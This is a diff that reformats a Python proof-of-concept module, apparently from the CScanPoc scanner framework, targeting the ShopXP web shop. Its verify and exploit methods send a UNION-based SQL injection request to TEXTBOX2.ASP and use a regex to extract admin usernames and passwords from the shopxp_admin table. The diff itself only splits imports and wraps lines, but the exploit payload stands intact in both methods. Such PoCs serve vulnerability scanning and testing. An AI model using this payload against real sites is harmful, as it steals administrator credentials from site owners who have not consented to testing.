@@ -2,8 +2,12 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request, urllib.parse, urllib.error
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.parse
+import urllib.error
+import urllib.request
+import urllib.error
+import urllib.parse
 import re
 
 
@@ -42,16 +46,18 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             payload = ("/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select"
                        "%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin")
             verify_url = '{target}'.format(target=self.target)+payload
-            content = urllib.request.urlopen(urllib.request.Request(verify_url)).read()
+            content = urllib.request.urlopen(
+                urllib.request.Request(verify_url)).read()
             pattern = re.compile(
                 r'.*?<body[^>]*?>(?P<account>[^<>]*?)</body>', re.I | re.S)
             match = pattern.match(content)
@@ -64,7 +70,8 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
@@ -72,7 +79,8 @@ class Poc(ABPoc):
             payload = ("/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select"
                        "%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin")
             verify_url = '{target}'.format(target=self.target)+payload
-            content = urllib.request.urlopen(urllib.request.Request(verify_url)).read()
+            content = urllib.request.urlopen(
+                urllib.request.Request(verify_url)).read()
             pattern = re.compile(
                 r'.*?<body[^>]*?>(?P<account>[^<>]*?)</body>', re.I | re.S)
             match = pattern.match(content)
